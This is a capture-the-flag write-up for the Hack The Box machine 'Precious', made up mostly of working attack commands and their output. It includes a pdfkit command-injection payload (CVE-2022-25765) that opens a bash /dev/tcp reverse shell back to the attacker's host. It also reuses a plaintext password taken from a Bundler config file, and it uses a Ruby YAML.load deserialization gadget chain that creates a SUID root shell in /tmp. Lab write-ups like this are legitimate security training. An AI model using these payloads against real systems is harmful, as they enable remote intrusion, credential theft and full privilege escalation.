# Target
| Category          | Details                                                  |
|-------------------|----------------------------------------------------------|
| 📝 **Name**       | [Precious](https://app.hackthebox.com/machines/Precious) |  
| 🏷 **Type**       | HTB Machine                                              |
| 🖥 **OS**         | Linux                                                    |
| 🎯 **Difficulty** | Easy                                                     |
| 📁 **Tags**       | Ruby, pdfkit, CVE-2022-25765, YAML.load                  |

# Scan
```
┌──(magicrc㉿perun)-[~/attack/HTB Precious]
└─$ nmap -sS -sC -sV $TARGET
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-15 11:32 CEST
Nmap scan report for 10.129.236.42
Host is up (0.025s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA)
|   256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA)
|_  256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Attack path
1. [Gain initial foothold using command injection in `pdfkit` (CVE-2022-25765)](#gain-initial-foothold-using-command-injection-in-pdfkit-cve-2022-25765)
2. [Escalate to the `henry` user with discovered credentials](#escalate-to-the-henry-user-with-discovered-credentials)
3. [Escalate to the `root` user using unsafe Ruby object deserialization in `YAML.load`](#escalate-to-the-root-user-using-unsafe-ruby-object-deserialization-in-yamlload)

### Gain initial foothold using command injection in `pdfkit` ([CVE-2022-25765](https://nvd.nist.gov/vuln/detail/CVE-2022-25765))

#### Add `precious.htb` to `/etc/hosts`
```
┌──(magicrc㉿perun)-[~/attack/HTB Precious]
└─$ echo "$TARGET precious.htb" | sudo tee -a /etc/hosts
10.129.236.187 precious.htb
```

#### Enumerate web application server with HTTP HEAD request
```
┌──(magicrc㉿perun)-[~/attack/HTB Precious]
└─$ curl -I http://precious.htb                                                                                                                    
HTTP/1.1 200 OK
Content-Type: text/html;charset=utf-8
Content-Length: 483
Connection: keep-alive
Status: 200 OK
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Date: Sun, 15 Jun 2025 20:07:00 GMT
X-Powered-By: Phusion Passenger(R) 6.0.15
Server: nginx/1.18.0 + Phusion Passenger(R) 6.0.15
X-Runtime: Ruby
```

Knowing that target is using Ruby to convert HTML under given URL to PDF, with simple Google query `https://www.google.com/search?q=Ruby+PDF+vulnerability`, we have identified [CVE-2022-25765](https://nvd.nist.gov/vuln/detail/CVE-2022-25765).

#### Listen for reverse shell
```
┌──(magicrc㉿perun)-[~/attack/HTB Precious]
└─$ nc -lnvp 4444       
listening on [any] 4444 ...
```

#### Spawn reverse shell connection by injecting command in URL used by `pdfkit`
```
LHOST=$(ip addr show tun0 | grep "inet " | awk '{print $2}' | cut -d'/' -f1) \
LPORT=4444 \
PAYLOAD=$(echo "http://?name=%20\`bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'\`" | jq -sRr @uri) \
curl http://precious.htb/ -d "url=$PAYLOAD"
```

#### Confirm initial foothold
```
connect to [10.10.14.157] from (UNKNOWN) [10.129.236.187] 42666
bash: cannot set terminal process group (678): Inappropriate ioctl for device
bash: no job control in this shell
ruby@precious:/var/www/pdfapp$ id
id
uid=1001(ruby) gid=1001(ruby) groups=1001(ruby)
```

### Escalate to the `henry` user with discovered credentials

#### Discover credentials in Bundler configuration
```
ruby@precious:/var/www/pdfapp$ cat /home/ruby/.bundle/config
cat /home/ruby/.bundle/config
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
```

#### Use credentials to gain access over SSH
```
┌──(magicrc㉿perun)-[~/attack/HTB Precious]
└─$ ssh henry@precious.htb        
henry@precious.htb's password: 
Linux precious 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
henry@precious:~$ id
uid=1000(henry) gid=1000(henry) groups=1000(henry)
```

### Escalate to the `root` user using unsafe Ruby object deserialization in `YAML.load`

#### List allowed sudo commands
```
henry@precious:~$ sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

#### Identify vulnerability in `/opt/update_dependencies.rb`
Script is using unsafe `YAML.load` deserialization.
```
henry@precious:~$ cat -n /opt/update_dependencies.rb
<SNIP>
     9  def list_from_file
    10      YAML.load(File.read("dependencies.yml"))
    11  end
<SNIP>
    17  gems_file = list_from_file
<SNIP>
```

#### Exploit vulnerability to spawn root shell
```
henry@precious:~$ { cat <<'EOF'> dependencies.yml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: cp /bin/bash /tmp/root_shell; chmod +s /tmp/root_shell
         method_id: :resolve
EOF
} && sudo /usr/bin/ruby /opt/update_dependencies.rb 2> /dev/null; /tmp/root_shell -p
root_shell-5.1# id
uid=1000(henry) gid=1000(henry) euid=0(root) egid=0(root) groups=0(root),1000(henry)
```
